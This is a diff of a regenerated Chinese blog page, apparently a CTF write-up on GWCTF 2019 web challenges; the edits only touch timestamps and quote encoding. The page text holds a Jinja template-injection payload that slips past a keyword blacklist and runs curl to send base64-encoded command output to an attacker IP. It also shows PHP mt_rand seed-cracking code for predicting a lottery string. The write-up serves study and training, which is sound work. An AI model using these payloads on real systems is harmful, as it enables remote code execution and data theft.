@@ -3,7 +3,7 @@
     <head prefix="og: http://ogp.me/ns# article: http://ogp.me/ns/article#">
     <meta charset="UTF-8" />
 
-    <meta name="generator" content="Hugo 0.90.1" /><meta name="theme-color" content="#fff" />
+    <meta name="generator" content="Hugo 0.110.0"><meta name="theme-color" content="#fff" />
     <meta name="color-scheme" content="light dark">
 
     
@@ -21,7 +21,7 @@
 
     
     
-        <script src="https://cdn.jsdelivr.net/npm/lunr@2.3.9/lunr.min.js" defer></script><script src="/js/meme.min.d82c753d66fbef2856c2724a5780616edad8aec63de7b22ad9f0da04399cf246.js"></script>
+        <script src="https://cdn.jsdelivr.net/npm/lunr@2.3.9/lunr.min.js" defer></script><script src="/js/meme.min.1a7822cfcef5444fb929909731e9fd1bdfdbe1d6148f6085416ab3527d76d403.js"></script>
 
     
 
@@ -57,7 +57,7 @@
         "@context": "https://schema.org",
         "@type": "BlogPosting",
         "datePublished": "2020-04-30T00:00:00+00:00",
-        "dateModified": "2022-10-30T10:47:31+08:00",
+        "dateModified": "2022-10-30T10:47:32+08:00",
         "url": "https://blog.wh1sper.com/posts/gwctf-2019-%E5%A4%8D%E7%8E%B0/",
         "headline": "GWCTF 2019 复现",
         "description": "广东外语外贸大学主办的比赛",
@@ -107,7 +107,7 @@
 <meta property="og:locale" content="zh" /><meta property="og:image" content="https://raw.githubusercontent.com/Anthem-whisper/imgbed/master/img/20210120170318.png" />
 <meta property="og:type" content="article" />
     <meta property="article:published_time" content="2020-04-30T00:00:00&#43;00:00" />
-    <meta property="article:modified_time" content="2022-10-30T10:47:31&#43;08:00" />
+    <meta property="article:modified_time" content="2022-10-30T10:47:32&#43;08:00" />
     
     <meta property="article:section" content="posts" />
 
@@ -244,7 +244,7 @@
     
     
         
-        <time datetime="2022-10-30T10:47:31&#43;08:00" class="post-meta-item modified dt-updated"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" class="icon post-meta-icon"><path d="M400 64h-48V12c0-6.627-5.373-12-12-12h-40c-6.627 0-12 5.373-12 12v52H160V12c0-6.627-5.373-12-12-12h-40c-6.627 0-12 5.373-12 12v52H48C21.49 64 0 85.49 0 112v352c0 26.51 21.49 48 48 48h352c26.51 0 48-21.49 48-48V112c0-26.51-21.49-48-48-48zm-6 400H54a6 6 0 0 1-6-6V160h352v298a6 6 0 0 1-6 6zm-52.849-200.65L198.842 404.519c-4.705 4.667-12.303 4.637-16.971-.068l-75.091-75.699c-4.667-4.705-4.637-12.303.068-16.971l22.719-22.536c4.705-4.667 12.303-4.637 16.97.069l44.104 44.461 111.072-110.181c4.705-4.667 12.303-4.637 16.971.068l22.536 22.718c4.667 4.705 4.636 12.303-.069 16.97z"/></svg>&nbsp;2022.10.30</time>
+        <time datetime="2022-10-30T10:47:32&#43;08:00" class="post-meta-item modified dt-updated"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" class="icon post-meta-icon"><path d="M400 64h-48V12c0-6.627-5.373-12-12-12h-40c-6.627 0-12 5.373-12 12v52H160V12c0-6.627-5.373-12-12-12h-40c-6.627 0-12 5.373-12 12v52H48C21.49 64 0 85.49 0 112v352c0 26.51 21.49 48 48 48h352c26.51 0 48-21.49 48-48V112c0-26.51-21.49-48-48-48zm-6 400H54a6 6 0 0 1-6-6V160h352v298a6 6 0 0 1-6 6zm-52.849-200.65L198.842 404.519c-4.705 4.667-12.303 4.637-16.971-.068l-75.091-75.699c-4.667-4.705-4.637-12.303.068-16.971l22.719-22.536c4.705-4.667 12.303-4.637 16.97.069l44.104 44.461 111.072-110.181c4.705-4.667 12.303-4.637 16.971.068l22.536 22.718c4.667 4.705 4.636 12.303-.069 16.97z"/></svg>&nbsp;2022.10.30</time>
     
     
     
@@ -301,21 +301,21 @@
 <pre tabindex="0"><code>hello !
 </code></pre><p>说明if被替换为空了，尝试双写iiff，但是还是被替换为空了，可能是用的循环匹配。</p>
 <p>参考了师傅写的wp，fuzz出来的过滤可能是这个样子：</p>
-<pre tabindex="0"><code>blacklist = ['import', 'getattr', 'os', 'class', 'subclasses', 'mro', 'request', 'args', 'eval',
-                 'if', 'for',' subprocess', 'file', 'open', 'popen', 'builtins', 'compile',
-                 'execfile', 'from_pyfile', 'local','self', 'item', 'getitem', 'getattribute', 
-                 'func_globals', 'config']
+<pre tabindex="0"><code>blacklist = [&#39;import&#39;, &#39;getattr&#39;, &#39;os&#39;, &#39;class&#39;, &#39;subclasses&#39;, &#39;mro&#39;, &#39;request&#39;, &#39;args&#39;, &#39;eval&#39;,
+                 &#39;if&#39;, &#39;for&#39;,&#39; subprocess&#39;, &#39;file&#39;, &#39;open&#39;, &#39;popen&#39;, &#39;builtins&#39;, &#39;compile&#39;,
+                 &#39;execfile&#39;, &#39;from_pyfile&#39;, &#39;local&#39;,&#39;self&#39;, &#39;item&#39;, &#39;getitem&#39;, &#39;getattribute&#39;, 
+                 &#39;func_globals&#39;, &#39;config&#39;]
 for no in blacklist:
     while True:
         if no in s:
-            s = s.replace(no, '')
+            s = s.replace(no, &#39;&#39;)
         else:
             break
 return s
 </code></pre><p>考察黑名单过滤逻辑错误，这种过滤，利用黑名单中最后一个词进行混淆来过滤是最好了，即 <code>if=&gt;iconfigf</code> ，因为是用黑名单的关键词按顺序来对输入进行替换的，那么最后一个 <code>config</code> 被替换之后，过滤也就结束了。</p>
 <p>那么我们在所有被过滤的关键词中间都可以插入一个config来避开过滤；</p>
 <p>最终playlaod：</p>
-<pre tabindex="0"><code>{% iconfigf ''.__clconfigass__.__mconfigro__[2].__subclaconfigsses__()[59].__init__.__globals__['linecache'].oconfigs.system('curl http://174.0.225.32/?a=`ls \|base64`') %}1{% endiconfigf %}
+<pre tabindex="0"><code>{% iconfigf &#39;&#39;.__clconfigass__.__mconfigro__[2].__subclaconfigsses__()[59].__init__.__globals__[&#39;linecache&#39;].oconfigs.system(&#39;curl http://174.0.225.32/?a=`ls \|base64`&#39;) %}1{% endiconfigf %}
 #相当于把ls的结果进行base64编码后（不然只能显示一行），以curl的方式发送到攻击机
 </code></pre><p>flag{a2bc941d-a38d-42bb-97be-fe2440442cdf}</p>
 <h3 id="枯燥的抽奖httpsbuuojcnchallengesgwctf202019枯燥的抽奖"><a href="#枯燥的抽奖httpsbuuojcnchallengesgwctf202019枯燥的抽奖" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href="#contents:枯燥的抽奖httpsbuuojcnchallengesgwctf202019枯燥的抽奖" class="headings"><a href="https://buuoj.cn/challenges#%5BGWCTF%202019%5D%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96" target="_blank" rel="noopener">枯燥的抽奖</a></a></h3>
@@ -325,32 +325,32 @@ return s
 <p>随便输一个提交，随即给出源码：</p>
 <pre tabindex="0"><code>&lt;?php
 #这不是抽奖程序的源代码！不许看！
-header(&quot;Content-Type: text/html;charset=utf-8&quot;);
+header(&#34;Content-Type: text/html;charset=utf-8&#34;);
 session_start();
-if(!isset($_SESSION['seed'])){
-$_SESSION['seed']=rand(0,999999999);
+if(!isset($_SESSION[&#39;seed&#39;])){
+$_SESSION[&#39;seed&#39;]=rand(0,999999999);
 }
 
-mt_srand($_SESSION['seed']);
-$str_long1 = &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;;
-$str='';
+mt_srand($_SESSION[&#39;seed&#39;]);
+$str_long1 = &#34;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&#34;;
+$str=&#39;&#39;;
 $len1=20;
 for ( $i = 0; $i &lt; $len1; $i++ ){
     $str.=substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1);       
 }
 $str_show = substr($str, 0, 10);
-echo &quot;&lt;p id='p1'&gt;&quot;.$str_show.&quot;&lt;/p&gt;&quot;;
+echo &#34;&lt;p id=&#39;p1&#39;&gt;&#34;.$str_show.&#34;&lt;/p&gt;&#34;;
 
 
-if(isset($_POST['num'])){
-    if($_POST['num']===$str){x
-        echo &quot;&lt;p id=flag&gt;抽奖，就是那么枯燥且无味，给你flag{xxxxxxxxx}&lt;/p&gt;&quot;;
+if(isset($_POST[&#39;num&#39;])){
+    if($_POST[&#39;num&#39;]===$str){x
+        echo &#34;&lt;p id=flag&gt;抽奖，就是那么枯燥且无味，给你flag{xxxxxxxxx}&lt;/p&gt;&#34;;
     }
     else{
-        echo &quot;&lt;p id=flag&gt;没抽中哦，再试试吧&lt;/p&gt;&quot;;
+        echo &#34;&lt;p id=flag&gt;没抽中哦，再试试吧&lt;/p&gt;&#34;;
     }
 }
-show_source(&quot;check.php&quot;);
+show_source(&#34;check.php&#34;);
 </code></pre><p>意思大概是：</p>
 <p>一个20次的循环，每次从 <code>$str_long1</code> 随机取一个字符，拼接成最后的 <code>$str</code> 。</p>
 <ul>
@@ -359,17 +359,17 @@ show_source(&quot;check.php&quot;);
 <p>我们来写段代码。</p>
 <pre tabindex="0"><code>&lt;?php
 mt_srand(12345);
-echo mt_rand().&quot;&lt;br/&gt;&quot;;
+echo mt_rand().&#34;&lt;br/&gt;&#34;;
 ?&gt;
 </code></pre><p>我们访问，输出 <code>162946439</code> 。</p>
 <p>现在代码改为</p>
 <pre tabindex="0"><code>&lt;?php 
 mt_srand(12345); 
-echo mt_rand().&quot;&lt;br/&gt;&quot;;
-echo mt_rand().&quot;&lt;br/&gt;&quot;;
-echo mt_rand().&quot;&lt;br/&gt;&quot;;
-echo mt_rand().&quot;&lt;br/&gt;&quot;;
-echo mt_rand().&quot;&lt;br/&gt;&quot;;
+echo mt_rand().&#34;&lt;br/&gt;&#34;;
+echo mt_rand().&#34;&lt;br/&gt;&#34;;
+echo mt_rand().&#34;&lt;br/&gt;&#34;;
+echo mt_rand().&#34;&lt;br/&gt;&#34;;
+echo mt_rand().&#34;&lt;br/&gt;&#34;;
 ?&gt;
 </code></pre><p>我们再次访问:</p>
 <pre tabindex="0"><code>162946439
@@ -402,16 +402,16 @@ echo mt_rand().&quot;&lt;br/&gt;&quot;;
 <p>我们的思路就是根据他给出的10为数据，来爆破他的随机数种子，然后在把剩下的随机数输出</p>
 <p>因为是用的php_mt_seed，我们要用他的格式，这是转换成随机数的脚本</p>
 <pre tabindex="0"><code>&lt;?php
-$pass_now = &quot;JAfq968Gqy&quot;;//给出的密钥
-$allowable_characters = '
-abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ';//字母表
+$pass_now = &#34;JAfq968Gqy&#34;;//给出的密钥
+$allowable_characters = &#39;
+abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&#39;;//字母表
 
 $length = strlen($allowable_characters) - 1;
 
 for ($j = 0; $j &lt; strlen($pass_now); $j++) {//遍历密钥
     for ($i = 0; $i &lt; $length; $i++) {//遍历字母表
         if ($pass_now[$j] == $allowable_characters[$i]) {
-            echo &quot;$i $i 0 $length &quot;;
+            echo &#34;$i $i 0 $length &#34;;
             break;
         }
     }
@@ -429,8 +429,8 @@ for ($j = 0; $j &lt; strlen($pass_now); $j++) {//遍历密钥
 <p>然后我们直接把他原来的代码拷贝过来，种子替换为我们爆破出来的：</p>
 <pre tabindex="0"><code>&lt;?php
 mt_srand(591614089);
-$str_long1 = &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;;
-$str='';
+$str_long1 = &#34;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&#34;;
+$str=&#39;&#39;;
 $len1=20;
 for ( $i = 0; $i &lt; $len1; $i++ ){
     $str.=substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1);       
@@ -468,7 +468,7 @@ echo $str_show;
 
         
     <div class="updated-badge-container">
-        <span title="Updated @ 2022-10-30 10:47:31 CST" style="cursor:help">
+        <span title="Updated @ 2022-10-30 10:47:32 CST" style="cursor:help">
 
 <svg xmlns="http://www.w3.org/2000/svg" width="130" height="20" class="updated-badge"><linearGradient id="b" x2="0" y2="100%"><stop offset="0" stop-color="#bbb" stop-opacity=".1"/><stop offset="1" stop-opacity=".1"/></linearGradient><clipPath id="a"><rect width="130" height="20" rx="3" fill="#fff"/></clipPath><g clip-path="url(#a)"><path class="updated-badge-left" d="M0 0h55v20H0z"/><path class="updated-badge-right" d="M55 0h75v20H55z"/><path fill="url(#b)" d="M0 0h130v20H0z"/></g><g fill="#fff" text-anchor="middle" font-size="110"><text x="285" y="150" fill="#010101" fill-opacity=".3" textLength="450" transform="scale(.1)">updated</text><text x="285" y="140" textLength="450" transform="scale(.1)">updated</text><text x="915" y="150" fill="#010101" fill-opacity=".3" textLength="650" transform="scale(.1)">2022-10-30</text><text x="915" y="140" textLength="650" transform="scale(.1)">2022-10-30</text></g></svg>
         </span></div>
